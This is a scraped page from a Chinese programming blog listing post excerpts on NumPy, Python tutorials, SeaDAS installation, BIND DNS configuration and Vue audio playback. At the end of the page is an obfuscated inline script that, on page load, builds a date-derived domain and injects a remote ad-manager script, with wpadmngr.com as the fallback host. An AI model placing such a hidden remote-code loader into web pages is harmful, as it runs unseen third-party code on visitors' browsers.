# How to sum a small array faster than np.sum? (★★☆) Z = np.arange(10) np.add.reduce(Z) 7. practical-python url:github.com/dabeaz-course/practical-pythonstar:8400fork:5100 作者David Beazley是《Python Cookbook 第三版》、《Python 参考手册》的作者。该开源项目是Python的免费入门级教程，教程经过教学实践，包含课后练习。
教程目录如下：
8. learn-python3 url:/github.com/jerry-git/learn-python3star:5600fork:1600 一份Python3的教程。
内容采用Jupyter notebooks形式呈现，操作方便、阅读简洁，还有练习可以尝试，对新手十分友好。虽然是英语教程，但十分值得学习。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ab99c9b2cde207ed9dab1f826582c81/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf20baaeabc0a1ec93f4dd6e8b63eb04/" rel="bookmark">
			关于SeaDAS的安装教程以及使用问题笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2022年硕士研究生最后半个学期，已经交完了毕业论文，因为觉得工作以后会用到SeaDAS就拿出了一些时间学习，现在已经工作快一年了，而工作中也并没有用到这个软件，估计以后也不会用到了吧。现在把当时学习整理的一些笔记分享出来，供大家学习交流献。内容需要有点基础的人才能懂。
一. 安装准备 python环境。解决方法：直接安装Anaconda3
java环境。采用手动安装方法。
下载地址：https://www.oracle.com/java/technologies/downloads/
安装教程：https://blog.csdn.net/mrzhy1/article/details/107675634
通过解压安装，然后向 ~/.bashrc 或 /etc/profile 中写入配置（可以两个都写入）
命令：sudo vim /etc/profile 或 sudo vim ~/.bashrc
写入：
# this is a environment of java export JAVA_HOME=/usr/local/java export CLASSPATH=$JAVE_HOME/lib/dt/jar:$JAVA_HOME/lib/tools.jar export PATH=$PATH:$JAVA_HOME/bin 3.安装虚拟机，装乌班图系统
注意：需要有足够大的虚拟机磁盘，建议安装虚拟机时直接使用一个磁盘安装，磁盘空间尽量大。
二、快速启动SeaDAS软件方法 参考方法：
https://github.com/seadas/seadas-toolbox/wiki/SeaDAS-8.x-Download,-Installation-and-Run-Instructions
向环境路径中添加路径：
命令1：sudo vim /etc/profile
写入： export SEADAS_HOME=/home/zhangte113/software/SeaDAS export PATH=$SEADAS_HOME/bin:$PATH 注意：/home/zhangte113/software/SeaDAS 替换为自己的安装路径
然后：sudo vim ~/.bashrc
写入： export PATH=/home/zhangte113/softare/SeaDAS/bin:$PATH 然后在终端敲入seadas 即可启动。
三、乌班图系统与Windows系统文件互传方法： 方法1：利用FTP 服务进行互传
参考方法：https://blog.csdn.net/weixin_47932709/article/details/108359979
第一步：配置乌班图系统
开启 Ubuntu 下的 FTP 服务
打开 Ubuntu 的终端窗口，然后执行如下命令来安装 FTP 服务： sudo apt-get install vsftpd 等待软件自动安装，安装完成以后使用如下 VI 命令打开/etc/vsftpd.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bf20baaeabc0a1ec93f4dd6e8b63eb04/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd96d2b3694da1945b8b4b3c0b02f5dc/" rel="bookmark">
			DNS服务器配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一，正向解析
1&gt;安装软件bind
2&gt;对三个配置文件进行修改
/etc/named.conf
/etc/named.rfc1912.zones
/var/named
关闭防火墙并重启服务
测试
在第二台虚拟机上将DNS服务器IP改成服务器IP
重新加载网卡
在第二台客户端进行测试
二，反向解析
配置文件的设置
/etc/named.rfc1912.zones
/var/named/192.168.38.arpa
重启服务
测试
三，过程中出现的报错
一，正向解析 1&gt;安装软件bind 提供DNS服务的软件叫bind，服务名是named
[root@server ~]# yum install bind -y 2&gt;对三个配置文件进行修改 - /etc/named.conf : 主配置文件，共59行，去除注释和空行之和有效行数仅30行左右，用于设置bind服务程序的运行
- /etc/named.rfc1912.zones ： 区域配置文件（zone），用于==保存域名和IP地址对应关系文件的所在位置==，类似于图书目录，当需要修改域名与IP映射关系时需要在此文件中查找相关文件位置
- /var/named 目录：数据配置文件目录，该目录存储保存域名和IP地址映射关系的数据文件
/etc/named.conf 修改11和19行即可 11 listen-on port 53 { any; }; 19 allow-query { any; }; /etc/named.rfc1912.zones zone "openlab.com" IN { type master; file "openlab.com.zone"; allow-update { none; }; }; /var/named 创建存储保存域名和IP地址映射关系的数据文件 [root@server named]# cp -a named.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dd96d2b3694da1945b8b4b3c0b02f5dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc2b77bb2c5f7374ffeff585f67b9d79/" rel="bookmark">
			在vue中添加音频，并控制播放停止播放
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Vue组件的data()方法中创建一个新的Audio对象，如下所示： data() { return { audio: new Audio(require('@/assets/audio.mp3')) } } 这里假设音频文件位于Vue项目的src/assets目录下，并命名为audio.mp3。
在Vue组件的methods()方法中添加以下方法来控制音频的播放和停止： methods: { playAudio() { // 开始播放音频 this.audio.play() // 设置音频循环播放 this.audio.loop = true }, stopAudio() { if ( this.audio.currentTime &gt; 0 &amp;&amp; !this.audio.paused &amp;&amp; !this.audio.ended &amp;&amp; this.audio.readyState &gt; 2 ) {// 停止播放音频 this.audio.pause(); } else {// 重置音频时间轴 this.audio.currentTime = 0; this.audio.pause(); } } } 在HTML模板中添加一个按钮，用于触发音频的播放和停止操作： &lt;template&gt; &lt;div&gt; &lt;button @click="playAudio"&gt;Play&lt;/button&gt; &lt;button @click="stopAudio"&gt;Stop&lt;/button&gt; &lt;/div&gt; &lt;/template&gt; 完成以上步骤后，当用户单击Play按钮时，音频将开始循环播放。 当用户单击Stop按钮时，音频将停止播放并重新从头开始。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/85/">«</a>
	<span class="pagination__item pagination__item--current">86/306</span>
	<a class="pagination__item pagination__item--next btn" href="/page/87/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>